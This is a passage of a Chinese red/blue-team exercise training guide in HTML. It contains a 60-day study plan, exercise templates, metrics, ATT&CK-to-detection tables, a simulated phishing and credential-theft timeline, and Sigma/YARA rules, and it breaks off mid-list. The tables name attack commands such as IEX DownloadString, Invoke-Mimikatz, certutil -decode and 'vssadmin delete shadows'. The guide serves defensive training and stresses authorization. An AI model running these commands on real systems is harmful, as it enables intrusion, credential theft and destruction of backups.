+<li><strong>内部影响力</strong>：定期分享技术成果、组织攻防演练培训、编写工具文档。</li>
+<li><strong>行业影响力</strong>：投稿安全峰会、开源工具、撰写白皮书、参与标准制定。</li>
+<li><strong>商业价值</strong>：帮助企业搭建安全产品原型、评估安全投资ROI、对接客户需求。</li>
+<li><strong>个人品牌</strong>：维护技术博客、运营社交媒体、参加播客/直播。</li>
+</ol>
+<h3 id="面试与晋升准备"><a class="header" href="#面试与晋升准备">面试与晋升准备</a></h3>
+<ul>
+<li><strong>红队</strong>：展示完整攻击链案例、代码评审、抗检测策略、作战手册。</li>
+<li><strong>蓝队</strong>：呈现检测规则库、告警降噪、典型事件响应流程、SOAR剧本。</li>
+<li><strong>紫队/架构</strong>：演示指标看板、攻防协同流程、组织治理案例、跨部门沟通能力。</li>
+<li><strong>通用</strong>：STAR法则描述问题与成效，准备量化指标（MTTD/MTTR、覆盖率、节约成本）。</li>
+</ul>
+<hr />
+<hr />
+<h2 id="模块十60天强化训练计划"><a class="header" href="#模块十60天强化训练计划">模块十：60天强化训练计划</a></h2>
+<h3 id="模块总览训练视角"><a class="header" href="#模块总览训练视角">模块总览（训练视角）</a></h3>
+<ul>
+<li><strong>设计原则</strong>：以实战为中心，将红队、蓝队、紫队技能交替训练，强调成果可验证与项目化输出。</li>
+<li><strong>路径结构</strong>：基础 → 进阶 → 蓝队 → 复盘 → 综合 → 作品集。</li>
+<li><strong>配套工具</strong>：学习周报模板、OKR看板、时间投入追踪表、练习题库。</li>
+</ul>
+<h3 id="第1-2周红队基础"><a class="header" href="#第1-2周红队基础">第1-2周：红队基础</a></h3>
+<p><strong>Day 1-7</strong>:</p>
+<ul>
+<li>MITRE ATT&amp;CK框架学习</li>
+<li>Cobalt Strike基础操作</li>
+<li>钓鱼攻击技术</li>
+</ul>
+<p><strong>Day 8-14</strong>:</p>
+<ul>
+<li>PowerShell攻击技术</li>
+<li>权限提升实战</li>
+<li>横向移动练习</li>
+</ul>
+<h3 id="第3-4周红队进阶"><a class="header" href="#第3-4周红队进阶">第3-4周：红队进阶</a></h3>
+<p><strong>Day 15-21</strong>:</p>
+<ul>
+<li>C2通信隐蔽化</li>
+<li>防御规避技术</li>
+<li>自定义工具开发</li>
+</ul>
+<p><strong>Day 22-28</strong>:</p>
+<ul>
+<li>完成5台内网靶机</li>
+<li>模拟APT攻击链</li>
+<li>红队报告编写</li>
+</ul>
+<h3 id="第5-6周蓝队基础"><a class="header" href="#第5-6周蓝队基础">第5-6周：蓝队基础</a></h3>
+<p><strong>Day 29-35</strong>:</p>
+<ul>
+<li>SIEM系统部署</li>
+<li>日志分析技术</li>
+<li>检测规则编写</li>
+</ul>
+<p><strong>Day 36-42</strong>:</p>
+<ul>
+<li>威胁狩猎实践</li>
+<li>应急响应演练</li>
+<li>取证分析基础</li>
+</ul>
+<h3 id="第7-8周蓝队进阶"><a class="header" href="#第7-8周蓝队进阶">第7-8周：蓝队进阶</a></h3>
+<p><strong>Day 43-49</strong>:</p>
+<ul>
+<li>高级威胁检测</li>
+<li>内存取证分析</li>
+<li>恶意软件分析</li>
+</ul>
+<p><strong>Day 50-56</strong>:</p>
+<ul>
+<li>完整事件响应</li>
+<li>SOC流程优化</li>
+<li>蓝队报告编写</li>
+</ul>
+<h3 id="第9-10周综合实战"><a class="header" href="#第9-10周综合实战">第9-10周：综合实战</a></h3>
+<p><strong>Day 57-60</strong>:</p>
+<ul>
+<li>红蓝对抗演练</li>
+<li>紫队协同优化</li>
+<li>总结与复盘</li>
+</ul>
+<hr />
+<h3 id="学习周报模板"><a class="header" href="#学习周报模板">学习周报模板</a></h3>
+<pre><code class="language-markdown">## 周报周期：2024-W15
+
+### 本周目标达成情况
+- [x] 完成3个Atomic Red Team场景复现
+- [x] 新增2条Sigma规则并验证
+- [ ] 完成CloudGoat场景（延期：缺少AWS账号）
+
+### 关键成果与产出
+- Red Team：完成钓鱼→内网→数据渗出的完整链路复盘文档
+- Blue Team：上线`PS_EncodedCommand`检测规则，误报率下降30%
+- Purple Team：更新联动看板，新增4个行动项
+
+### 问题与阻塞
+- 缺少生产环境流量样本，计划与网络团队协调
+- EDR策略更新审批流程较长，建议与安全策略团队同步优化
+
+### 下周计划
+- 完成CloudGoat场景并输出复盘
+- 编写SOAR剧本：隔离可疑主机 + 获取内存镜像
+- 参加内部分享《演练指标设计实战》
+
+### 需要的支持
+- 申请测试网段开放Outbound端口 80/443/8080
+- 安排一次与业务负责人交流会议（演练影响评估）
+</code></pre>
+<h3 id="时间投入追踪表示例"><a class="header" href="#时间投入追踪表示例">时间投入追踪表（示例）</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>日期</th><th>模块</th><th>活动</th><th>时长(h)</th><th>备注</th></tr></thead><tbody>
+<tr><td>2024-04-01</td><td>红队</td><td>ATT&amp;CK Recon练习</td><td>2.5</td><td>完成3个子域场景</td></tr>
+<tr><td>2024-04-02</td><td>红队</td><td>C2环境部署</td><td>3</td><td>Ansible自动化成功</td></tr>
+<tr><td>2024-04-03</td><td>蓝队</td><td>SIEM规则调试</td><td>2</td><td>命中率提升</td></tr>
+<tr><td>2024-04-04</td><td>蓝队</td><td>Threat Hunting</td><td>2.5</td><td>发现异常RDP行为</td></tr>
+<tr><td>2024-04-05</td><td>紫队</td><td>联动会议与复盘</td><td>1.5</td><td>形成5个行动项</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p>建议使用Notion/Obsidian/Excel维护学习轨迹，形成可复用案例库。</p>
+</blockquote>
+<hr />
+<h2 id="-安全提醒"><a class="header" href="#-安全提醒">⚠️ 安全提醒</a></h2>
+<ol>
+<li><strong>合法授权</strong>: 所有活动必须获得书面授权</li>
+<li><strong>保密义务</strong>: 严格保护演练信息和发现</li>
+<li><strong>最小影响</strong>: 避免影响业务正常运行</li>
+<li><strong>及时沟通</strong>: 发现重大问题立即报告</li>
+<li><strong>持续学习</strong>: 攻防技术不断演进</li>
+</ol>
+<hr />
+<h2 id="附录a演练核心文档模板"><a class="header" href="#附录a演练核心文档模板">附录A：演练核心文档模板</a></h2>
+<h3 id="a1-授权与沟通模板"><a class="header" href="#a1-授权与沟通模板">A.1 授权与沟通模板</a></h3>
+<pre><code class="language-markdown"># 红蓝对抗授权书
+- 项目名称：&lt;填写&gt;
+- 演练时间：&lt;开始日期&gt; 至 &lt;结束日期&gt;
+- 演练范围：&lt;系统/网段/资产列表&gt;
+- 排除范围：&lt;禁止攻击的系统或业务&gt;
+- 责任分工：红队/蓝队/白队/紫队联系人、电话、值班时间
+- 安全限制：禁止DoS、禁止删除数据、禁止影响生产、触发L2/L3须暂停
+- 证据要求：红队须保留命令、日志；蓝队须保留告警、响应记录；白队统一归档
+- 法务条款：保密协议、责任范围、数据处理要求、回滚责任
+- 签署：甲方/乙方/见证人
+</code></pre>
+<h3 id="a2-演练计划模板"><a class="header" href="#a2-演练计划模板">A.2 演练计划模板</a></h3>
+<pre><code class="language-markdown"># 演练计划书
+1. 目标与成功标准
+2. 演练范围与排除项
+3. 关键资产优先级列表
+4. 时间线与里程碑（含每日例会安排）
+5. 人员与职责（RACI矩阵）
+6. 工具与环境准备（C2、SIEM、SOAR、靶场）
+7. 沟通与升级流程
+8. 风险评估与中止条件
+9. 证据与日志管理策略
+10. 演练指标（检测、响应、改进）
+</code></pre>
+<h3 id="a3-日报模板"><a class="header" href="#a3-日报模板">A.3 日报模板</a></h3>
+<pre><code class="language-markdown"># 红蓝对抗日报 - &lt;日期&gt;
+## 1. 红队行动摘要
+- 侦察：&lt;描述&gt;
+- 利用：&lt;描述&gt;
+- 横向：&lt;描述&gt;
+- 数据访问：&lt;描述&gt;
+
+## 2. 蓝队检测与响应
+- 告警数量：&lt;总数&gt;（高/中/低）
+- 关键检测：&lt;规则名称/时间/处理人&gt;
+- 响应措施：&lt;隔离/阻断/取证&gt;
+
+## 3. 风险评估
+- 影响资产：&lt;列表&gt;
+- 影响等级：&lt;L0/L1/L2/L3&gt;
+- 是否触发升级：&lt;是/否&gt;
+
+## 4. 问题与行动项
+- 问题：&lt;描述 / 责任人 / 截止时间&gt;
+- 行动项：&lt;描述 / 责任人 / 截止时间&gt;
+</code></pre>
+<h3 id="a4-演练复盘报告模板"><a class="header" href="#a4-演练复盘报告模板">A.4 演练复盘报告模板</a></h3>
+<pre><code class="language-markdown"># 红蓝对抗复盘报告
+1. 演练概览：目标、范围、时间、团队、指标达成情况
+2. 攻击链回顾：关键阶段、成功/失败、证据索引
+3. 检测与响应表现：MTTD、MTTR、误报/漏报统计
+4. 关键发现：按照风险等级列出问题、影响、建议
+5. 指标分析：检测覆盖率、行动项完成情况、改进建议
+6. 知识沉淀：检测规则、剧本更新、工具改进、培训需求
+7. 后续计划：改进行动项列表、复测计划、长期建设主题
+</code></pre>
+<hr />
+<h2 id="附录b对抗指标词典"><a class="header" href="#附录b对抗指标词典">附录B：对抗指标词典</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>指标</th><th>描述</th><th>计算方法</th><th>关注团队</th><th>备注</th></tr></thead><tbody>
+<tr><td>MTTD</td><td>平均检测时间</td><td>(告警时间-攻击开始时间) 平均值</td><td>蓝队</td><td>高价值资产单独统计</td></tr>
+<tr><td>MTTR</td><td>平均响应时间</td><td>(采取措施时间-告警时间) 平均值</td><td>蓝队/紫队</td><td>区分初步响应与完全修复</td></tr>
+<tr><td>Coverage</td><td>检测覆盖率</td><td>命中的ATT&amp;CK技术数 / 总技术数</td><td>蓝队</td><td>结合场景权重</td></tr>
+<tr><td>SuccessRate</td><td>红队任务成功率</td><td>完成任务数 / 总任务数</td><td>红队</td><td>包含隐蔽性评分</td></tr>
+<tr><td>ClosureRate</td><td>行动项关闭率</td><td>已关闭行动项 / 总行动项</td><td>白队/紫队</td><td>30天内追踪</td></tr>
+<tr><td>Automation</td><td>自动化覆盖率</td><td>自动化执行步骤 / 总步骤</td><td>蓝队/紫队</td><td>包含SOAR、脚本</td></tr>
+</tbody></table>
+</div>
+<hr />
+<h2 id="附录c常见攻击检测映射表"><a class="header" href="#附录c常见攻击检测映射表">附录C：常见攻击检测映射表</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>攻击阶段</th><th>MITRE技术</th><th>红队操作示例</th><th>预期日志/数据源</th><th>检测建议</th><th>应急动作</th></tr></thead><tbody>
+<tr><td>Initial Access</td><td>T1566 钓鱼</td><td>Gophish发送凭证钓鱼</td><td>邮件网关、代理日志</td><td>关键词过滤、链接信誉</td><td>阻断链接、通知受害者</td></tr>
+<tr><td>Execution</td><td>T1059 PowerShell</td><td>IEX下载执行payload</td><td>EventID 4104、Sysmon 1</td><td>Base64检测、关键函数监控</td><td>隔离终端、取证内存</td></tr>
+<tr><td>Persistence</td><td>T1547 Run Key</td><td>添加Run注册表项</td><td>Sysmon 13、4688</td><td>检测Run/RunOnce变化</td><td>清理持久化项</td></tr>
+<tr><td>Privilege Escalation</td><td>T1068 提权漏洞</td><td>利用CVE-2021-34527</td><td>应用程序日志、ETW</td><td>监测异常打印服务调用</td><td>打补丁、禁用服务</td></tr>
+<tr><td>Lateral Movement</td><td>T1021 SMB/RDP</td><td>CrackMapExec横向</td><td>4624、网络流量、Zeek</td><td>多主机登录、失败次数</td><td>禁止账户登录、重置凭证</td></tr>
+<tr><td>Exfiltration</td><td>T1041 网络渗出</td><td>上传数据到C2</td><td>流量日志、代理日志</td><td>数据包大小、加密外联</td><td>阻断出口、封禁域名</td></tr>
+</tbody></table>
+</div>
+<hr />
+<h2 id="附录d常见soar剧本示例"><a class="header" href="#附录d常见soar剧本示例">附录D：常见SOAR剧本示例</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>剧本名称</th><th>触发条件</th><th>自动化步骤</th><th>人工决策</th><th>输出</th></tr></thead><tbody>
+<tr><td><code>PS_EncodedCommand_Response</code></td><td>告警命中PowerShell Base64</td><td>收集主机信息 → 抓取脚本 → 上传EDR隔离请求</td><td>是否隔离终端？</td><td>工单、取证包、报告</td></tr>
+<tr><td><code>Credential_Dump_Response</code></td><td>检测到<code>mimikatz</code>字样</td><td>查询进程 → 导出内存 → 重置账户密码</td><td>判断业务影响与隔离策略</td><td>事件时间线、密码重置清单</td></tr>
+<tr><td><code>Data_Exfiltration_Stop</code></td><td>出口流量异常</td><td>阻断IP/域名 → 提取PCAP → 通知网络团队</td><td>是否解除阻断？</td><td>取证证据、阻断记录</td></tr>
+<tr><td><code>Purple_Validation</code></td><td>紫队场景验证完成</td><td>收集攻防数据 → 生成报告 → 创建改进行动项</td><td>确认行动项负责人</td><td>验证报告、行动项列表</td></tr>
+</tbody></table>
+</div>
+<hr />
+<h2 id="附录e术语与缩写表"><a class="header" href="#附录e术语与缩写表">附录E：术语与缩写表</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>缩写</th><th>英文全称</th><th>中文含义</th><th>说明</th></tr></thead><tbody>
+<tr><td>ATT&amp;CK</td><td>Adversarial Tactics, Techniques &amp; Common Knowledge</td><td>对手战术技术知识库</td><td>攻击者行为模型</td></tr>
+<tr><td>OPSEC</td><td>Operational Security</td><td>行动安全</td><td>保护红队自身安全与隐蔽</td></tr>
+<tr><td>TTP</td><td>Tactics, Techniques, Procedures</td><td>战术、技术、流程</td><td>描述攻击者行为细节</td></tr>
+<tr><td>SOAR</td><td>Security Orchestration, Automation and Response</td><td>安全编排自动化响应</td><td>自动化联动检测和响应</td></tr>
+<tr><td>MTTD</td><td>Mean Time To Detect</td><td>平均检测时间</td><td>蓝队效率核心指标</td></tr>
+<tr><td>MTTR</td><td>Mean Time To Respond</td><td>平均响应时间</td><td>反映响应速度</td></tr>
+<tr><td>D3FEND</td><td>Defensive Countermeasures</td><td>防御对策知识库</td><td>与ATT&amp;CK对照使用</td></tr>
+<tr><td>CTI</td><td>Cyber Threat Intelligence</td><td>网络威胁情报</td><td>驱动攻防演练与检测</td></tr>
+<tr><td>TTX</td><td>Tabletop Exercise</td><td>桌面演练</td><td>演练前的流程推演</td></tr>
+<tr><td>IOC</td><td>Indicator of Compromise</td><td>入侵指示器</td><td>用于检测攻击迹象</td></tr>
+</tbody></table>
+</div>
+<h2 id="附录f样例攻击-检测时间线数据集"><a class="header" href="#附录f样例攻击-检测时间线数据集">附录F：样例攻击-检测时间线数据集</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>序号</th><th>时间 (UTC+8)</th><th>日志来源</th><th>事件描述</th><th>攻击阶段</th><th>备注</th></tr></thead><tbody>
+<tr><td>001</td><td>2024-05-07 10:12:05</td><td>Gophish</td><td>邮件 <code>HR-福利调整</code> 发送给 alice@corp.com</td><td>Recon/Delivery</td><td>邮件ID GH-0001</td></tr>
+<tr><td>002</td><td>2024-05-07 10:12:45</td><td>Gophish</td><td>收件人打开邮件, User-Agent <code>Outlook/16.0</code></td><td>Delivery</td><td>打开延迟40秒</td></tr>
+<tr><td>003</td><td>2024-05-07 10:12:47</td><td>Gophish</td><td>收件人点击钓鱼链接 <code>https://corp-hr.cn/login</code></td><td>Initial Access</td><td></td></tr>
+<tr><td>004</td><td>2024-05-07 10:12:49</td><td>Evilginx</td><td>捕获用户名 <code>alice@corp.com</code></td><td>Initial Access</td><td>SessionID EV-2134</td></tr>
+<tr><td>005</td><td>2024-05-07 10:12:52</td><td>Evilginx</td><td>捕获MFA验证码 <code>439872</code></td><td>Initial Access</td><td></td></tr>
+<tr><td>006</td><td>2024-05-07 10:13:07</td><td>VPN日志</td><td>新VPN连接来自45.77.12.34，用户alice</td><td>Initial Access</td><td>出口IP匹配拦截名单</td></tr>
+<tr><td>007</td><td>2024-05-07 10:13:09</td><td>白队记录</td><td>事件编号 RT-2024-001 创建</td><td>Governance</td><td></td></tr>
+<tr><td>008</td><td>2024-05-07 10:13:25</td><td>Sysmon (ID1)</td><td>目标主机 <code>HRPC01</code> 执行 <code>whoami</code></td><td>Execution</td><td>Beacon上线验证</td></tr>
+<tr><td>009</td><td>2024-05-07 10:13:32</td><td>Beacon 日志</td><td>C2回连成功，信标间隔60秒</td><td>C2</td><td>Profile HTTP-Profile-A</td></tr>
+<tr><td>010</td><td>2024-05-07 10:14:18</td><td>Sysmon (ID11)</td><td>PowerShell 加载 <code>Invoke-Mimikatz</code></td><td>Credential Access</td><td>命令哈希 0x9af3</td></tr>
+<tr><td>011</td><td>2024-05-07 10:14:22</td><td>EDR告警</td><td>策略 <code>Credential Theft</code> 触发（风险高）</td><td>Detection</td><td>SOC队列优先级P1</td></tr>
+<tr><td>012</td><td>2024-05-07 10:14:30</td><td>SIEM事件</td><td>生成告警 <code>PS_EncodedCommand</code></td><td>Detection</td><td>告警ID SIEM-4587</td></tr>
+<tr><td>013</td><td>2024-05-07 10:14:45</td><td>SOAR</td><td>Playbook <code>PS_EncodedCommand_Response</code> 自动执行</td><td>Response</td><td>已收集主机信息</td></tr>
+<tr><td>014</td><td>2024-05-07 10:15:03</td><td>SOAR</td><td>自动下发EDR隔离命令</td><td>Containment</td><td>等待审批</td></tr>
+<tr><td>015</td><td>2024-05-07 10:15:25</td><td>Analyst</td><td>分析师确认隔离</td><td>Response</td><td>审批人 SOC-Lead</td></tr>
+<tr><td>016</td><td>2024-05-07 10:15:41</td><td>EDR状态</td><td>主机 HRPC01 隔离成功</td><td>Response</td><td></td></tr>
+<tr><td>017</td><td>2024-05-07 10:16:02</td><td>Beacon 日志</td><td>Beacon掉线</td><td>Action on Objectives</td><td>红队记录成功触发检测</td></tr>
+<tr><td>018</td><td>2024-05-07 10:16:15</td><td>蓝队工单</td><td>事件单 INC-2024-051 创建</td><td>Governance</td><td></td></tr>
+<tr><td>019</td><td>2024-05-07 10:17:30</td><td>蓝队工单</td><td>记录初步影响评估</td><td>Governance</td><td></td></tr>
+<tr><td>020</td><td>2024-05-07 10:17:45</td><td>白队</td><td>更新计分表</td><td>Governance</td><td></td></tr>
+<tr><td>021</td><td>2024-05-07 10:18:12</td><td>PowerShell日志</td><td>主机 <code>FINPC02</code> 执行下载命令</td><td>Execution</td><td></td></tr>
+<tr><td>022</td><td>2024-05-07 10:18:20</td><td>Proxy日志</td><td>请求 <code>https://cdn.corp-update.com/payload.ps1</code></td><td>Delivery</td><td>URL被过滤标记</td></tr>
+<tr><td>023</td><td>2024-05-07 10:18:30</td><td>蓝队</td><td>创建狩猎任务 <code>HNT-221</code></td><td>Threat Hunting</td><td></td></tr>
+<tr><td>024</td><td>2024-05-07 10:18:55</td><td>Beacon 日志</td><td><code>FINPC02</code> 信标上线</td><td>C2</td><td></td></tr>
+<tr><td>025</td><td>2024-05-07 10:19:07</td><td>Sysmon</td><td><code>FINPC02</code> 执行 <code>net use \FILE01\share</code></td><td>Lateral Movement</td><td></td></tr>
+<tr><td>026</td><td>2024-05-07 10:19:12</td><td>Zeek SMB</td><td>记录新SMB会话</td><td>Lateral Movement</td><td></td></tr>
+<tr><td>027</td><td>2024-05-07 10:19:34</td><td>Zeek Notice</td><td>触发规则 <code>SMB_PTH</code></td><td>Detection</td><td></td></tr>
+<tr><td>028</td><td>2024-05-07 10:19:50</td><td>SOAR</td><td>自动禁用账号 <code>alice</code></td><td>Response</td><td></td></tr>
+<tr><td>029</td><td>2024-05-07 10:20:05</td><td>蓝队</td><td>通知IT确认合法性</td><td>Governance</td><td></td></tr>
+<tr><td>030</td><td>2024-05-07 10:21:20</td><td>红队</td><td>报告蓝队已阻断</td><td>Governance</td><td></td></tr>
+<tr><td>031</td><td>2024-05-07 10:22:00</td><td>日报</td><td>记录“检测耗时 1分55秒”</td><td>Metrics</td><td></td></tr>
+<tr><td>032</td><td>2024-05-07 10:25:07</td><td>蓝队</td><td>收集内存镜像</td><td>Forensics</td><td></td></tr>
+<tr><td>033</td><td>2024-05-07 10:27:45</td><td>蓝队</td><td>上传证据至取证平台</td><td>Forensics</td><td></td></tr>
+<tr><td>034</td><td>2024-05-07 10:32:12</td><td>红队</td><td>清理持久化、解除VPN</td><td>Recovery</td><td></td></tr>
+<tr><td>035</td><td>2024-05-07 10:45:00</td><td>白队</td><td>更新风险台账 L1</td><td>Governance</td><td></td></tr>
+<tr><td>036</td><td>2024-05-07 11:30:00</td><td>SOC</td><td>完成初步报告</td><td>Governance</td><td></td></tr>
+<tr><td>037</td><td>2024-05-07 15:00:00</td><td>紫队会议</td><td>讨论检测漏点</td><td>Improvement</td><td></td></tr>
+<tr><td>038</td><td>2024-05-07 16:30:00</td><td>行动项</td><td>创建改进项 ACT-008</td><td>Improvement</td><td></td></tr>
+<tr><td>039</td><td>2024-05-08 09:00:00</td><td>改进</td><td>完成ACT-008</td><td>Improvement</td><td></td></tr>
+<tr><td>040</td><td>2024-05-10 09:30:00</td><td>复测</td><td>WMI检测成功</td><td>Validation</td><td></td></tr>
+<tr><td>041</td><td>2024-05-12 14:00:00</td><td>报告</td><td>最终报告草稿完成</td><td>Governance</td><td></td></tr>
+<tr><td>042</td><td>2024-05-15 10:00:00</td><td>复盘会</td><td>输出10项建议</td><td>Improvement</td><td></td></tr>
+<tr><td>043</td><td>2024-05-20 18:00:00</td><td>行动项跟踪</td><td>关闭率达90%</td><td>Metrics</td><td></td></tr>
+<tr><td>044</td><td>2024-05-30 09:00:00</td><td>回访</td><td>与业务总结</td><td>Governance</td><td></td></tr>
+<tr><td>045</td><td>2024-06-01 12:00:00</td><td>白队</td><td>归档证据、更新知识库</td><td>Improvement</td><td></td></tr>
+</tbody></table>
+</div>
+<h2 id="附录gattck-技术与检测规则映射示例"><a class="header" href="#附录gattck-技术与检测规则映射示例">附录G：ATT&amp;CK 技术与检测规则映射示例</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>战术</th><th>技术编号</th><th>技术名称</th><th>红队示例</th><th>检测数据源</th><th>规则/脚本</th><th>推荐响应</th></tr></thead><tbody>
+<tr><td>Initial Access</td><td>T1190</td><td>Exploit Public-Facing Application</td><td>Struts2远程命令执行</td><td>Web服务器日志、WAF、Sysmon 1</td><td>WAF规则<code>Struts2-OGNL</code>, Sysmon命令行匹配</td><td>临时封禁IP、修补漏洞</td></tr>
+<tr><td>Initial Access</td><td>T1133</td><td>External Remote Services</td><td>使用泄露VPN凭证</td><td>VPN日志、Radius日志</td><td>关联登录模式、地理位置检测</td><td>冻结账号、强制改密</td></tr>
+<tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td><td>IEX DownloadString</td><td>WinEvent 4104、Sysmon6</td><td>Sigma <code>powershell_encoded_command</code></td><td>隔离主机、抓取内存</td></tr>
+<tr><td>Execution</td><td>T1053</td><td>Scheduled Task</td><td>注册计划任务执行 payload</td><td>4698、Sysmon1</td><td>监控<code>schtasks.exe</code>新增任务</td><td>删除任务、调查作者</td></tr>
+<tr><td>Persistence</td><td>T1547.001</td><td>Registry Run Keys</td><td>添加Run键加载DLL</td><td>4657、Sysmon13</td><td>检测Run/RunOnce 修改</td><td>清理注册表、重启主机</td></tr>
+<tr><td>Persistence</td><td>T1037</td><td>Startup Items</td><td>将脚本放入启动项</td><td>文件审计、Sysmon</td><td>监控<code>Startup</code>目录文件</td><td>删除文件、提醒用户</td></tr>
+<tr><td>Privilege Escalation</td><td>T1068</td><td>Exploitation for Privilege Escalation</td><td>PrintNightmare</td><td>应用日志、Sysmon</td><td>检测<code>spoolsv</code>异常行为</td><td>禁用服务、打补丁</td></tr>
+<tr><td>Privilege Escalation</td><td>T1078</td><td>Valid Accounts</td><td>使用本地管理员密码重用</td><td>4624、EDR</td><td>识别横向登录</td><td>重置密码、启用LAPS</td></tr>
+<tr><td>Defense Evasion</td><td>T1112</td><td>Modify Registry</td><td>修改日志策略</td><td>4657、Sysmon</td><td>检测<code>AuditPolicy</code>更改</td><td>恢复策略、调查来源</td></tr>
+<tr><td>Defense Evasion</td><td>T1140</td><td>Deobfuscate/Decode Files</td><td><code>certutil -decode</code></td><td>Sysmon 11</td><td>参数检测</td><td>阻断后续执行</td></tr>
+<tr><td>Credential Access</td><td>T1003.001</td><td>LSASS Memory</td><td>Invoke-Mimikatz</td><td>Sysmon 10、EDR</td><td>监控<code>lsass</code>句柄访问</td><td>隔离主机、收集内存</td></tr>
+<tr><td>Credential Access</td><td>T1555</td><td>Credentials from Password Stores</td><td>导出浏览器密码</td><td>Sysmon 1、文件日志</td><td>检测<code>Login Data</code>访问</td><td>通知用户、重置凭证</td></tr>
+<tr><td>Discovery</td><td>T1087</td><td>Account Discovery</td><td><code>net user /domain</code></td><td>Sysmon 1、PowerShell</td><td>命令行关键字</td><td>审核来源</td></tr>
+<tr><td>Discovery</td><td>T1046</td><td>Network Service Scanning</td><td><code>nmap -p-</code></td><td>Zeek、Firewall</td><td>端口扫描检测</td><td>封禁扫描IP</td></tr>
+<tr><td>Lateral Movement</td><td>T1021.002</td><td>SMB/Windows Admin Shares</td><td>PsExec</td><td>5145、Sysmon 3</td><td>检测<code>psexec</code>行为</td><td>阻断共享、审计账号</td></tr>
+<tr><td>Lateral Movement</td><td>T1080</td><td>Taint Shared Content</td><td>替换共享目录文件</td><td>FIM</td><td>Hash对比报警</td><td>恢复文件</td></tr>
+<tr><td>Command and Control</td><td>T1071.001</td><td>Web Protocols</td><td>Cobalt Strike HTTP</td><td>Proxy、Zeek</td><td>Beacon检测</td><td>阻断域名</td></tr>
+<tr><td>Command and Control</td><td>T1095</td><td>Non-Application Layer Protocol</td><td>ICMP隧道</td><td>Zeek ICMP</td><td>数据包大小检测</td><td>阻断ICMP</td></tr>
+<tr><td>Exfiltration</td><td>T1048</td><td>Exfiltration Over Alternative Protocol</td><td>FTP上传数据</td><td>FTP日志、流量记录</td><td>监控FTP大流量</td><td>阻断会话</td></tr>
+<tr><td>Exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td><td>HTTP POST上传</td><td>Proxy</td><td>监控POST数据量</td><td>封禁请求</td></tr>
+<tr><td>Impact</td><td>T1486</td><td>Data Encrypted for Impact</td><td>勒索加密</td><td>文件审计、EDR</td><td>监控加密后缀</td><td>隔离终端</td></tr>
+<tr><td>Impact</td><td>T1490</td><td>Inhibit System Recovery</td><td>删除影子拷贝</td><td>Sysmon 1</td><td><code>vssadmin delete shadows</code></td><td>立即隔离</td></tr>
+</tbody></table>
+</div>
+<h2 id="附录hsigma-与-yara-示例规则"><a class="header" href="#附录hsigma-与-yara-示例规则">附录H：Sigma 与 YARA 示例规则</a></h2>
+<pre><code class="language-yaml"># Sigma: Suspicious Base64 PowerShell
+title: Suspicious PowerShell Base64 Execution
+id: 1f6f56b8-b5a0-4b9a-91c1-ps-encoded
+status: experimental
+description: Detects PowerShell execution with base64 encoded commands
+logsource:
+  product: windows
+  service: security
+  definition: 'EventID 4688'
+detection:
+  selection:
+    NewProcessName|endswith: '\powershell.exe'
+    CommandLine|contains|all:
+      - '-enc'
+      - 'FromBase64String'
+  condition: selection
+fields:
+  - CommandLine
+  - ParentProcessName
+  - User
+falsepositives:
+  - Legitimate administrative scripts
+level: high
+</code></pre>
+<pre><code class="language-yaml"># Sigma: SMB Pass-the-Hash Detection
+title: Potential Pass-the-Hash Via SMB
+id: a21dd550-9a29-4d1c-8d9b-smb-pth
+status: experimental
+logsource:
+  product: windows
+  service: security
+  definition: 'EventID 4624'
+detection:
+  selection:
+    AuthenticationPackageName: 'NTLM'
+    LogonType: 3
+  filter_known:
+    IpAddress|in:
+      - '10.10.10.10'
+      - '10.10.10.11'
+  timeframe: 10m
+  condition: selection and not filter_known
+level: high
+</code></pre>
+<pre><code class="language-yara">rule CobaltStrike_Beacon
+{
+    meta:
+        description = "Detects default cobalt strike beacon config"
+        author = "PurpleTeam"
+    strings:
+        $a = "MZ" ascii at 0
+        $b = { 2E 00 30 00 2E 00 30 00 2E 00 30 00 }
+        $c = "Cobalt Strike" ascii nocase
+    condition:
+        $a and $b and $c
+}
+</code></pre>
+<h2 id="附录i数据字段标准化清单"><a class="header" href="#附录i数据字段标准化清单">附录I：数据字段标准化清单</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>数据源</th><th>字段</th><th>描述</th><th>数据类型</th><th>示例</th></tr></thead><tbody>
+<tr><td>WinEvent</td><td>EventID</td><td>事件编号</td><td>integer</td><td>4688</td></tr>
+<tr><td>WinEvent</td><td>Computer</td><td>主机名</td><td>string</td><td>HRPC01</td></tr>
+<tr><td>WinEvent</td><td>CommandLine</td><td>进程命令</td><td>string</td><td>powershell.exe -enc JAB</td></tr>
+<tr><td>VPN日志</td><td>username</td><td>登录用户名</td><td>string</td><td>alice</td></tr>
+<tr><td>VPN日志</td><td>public_ip</td><td>用户公网IP</td><td>ip</td><td>45.77.12.34</td></tr>
+<tr><td>Proxy日志</td><td>url</td><td>访问URL</td><td>string</td><td>https://cdn.corp-update.com/payload.ps1</td></tr>
+<tr><td>Proxy日志</td><td>bytes_out</td><td>下行字节</td><td>integer</td><td>10485760</td></tr>
+<tr><td>Zeek</td><td>uid</td><td>会话ID</td><td>string</td><td>CH1i4U3dN9h</td></tr>
+<tr><td>Zeek</td><td>resp_h</td><td>响应IP</td><td>ip</td><td>10.10.20.15</td></tr>
+<tr><td>SOAR工单</td><td>ticket_id</td><td>工单编号</td><td>string</td><td>INC-2024-051</td></tr>
+<tr><td>SOAR工单</td><td>sla_due</td><td>SLA截止</td><td>datetime</td><td>2024-05-07T11:15:00</td></tr>
+<tr><td>指标库</td><td>metric_name</td><td>指标名称</td><td>string</td><td>MTTD</td></tr>
+<tr><td>指标库</td><td>metric_value</td><td>指标值</td><td>float</td><td>1.92</td></tr>
+<tr><td>指标库</td><td>target</td><td>目标值</td><td>float</td><td>2.00</td></tr>
+</tbody></table>
+</div>
+<h2 id="-总结"><a class="header" href="#-总结">📝 总结</a></h2>
+<p>红蓝对抗是提升组织安全能力的有效方法。通过模拟真实攻击，可以：</p>
+<ul>
+<li>发现防御盲点</li>
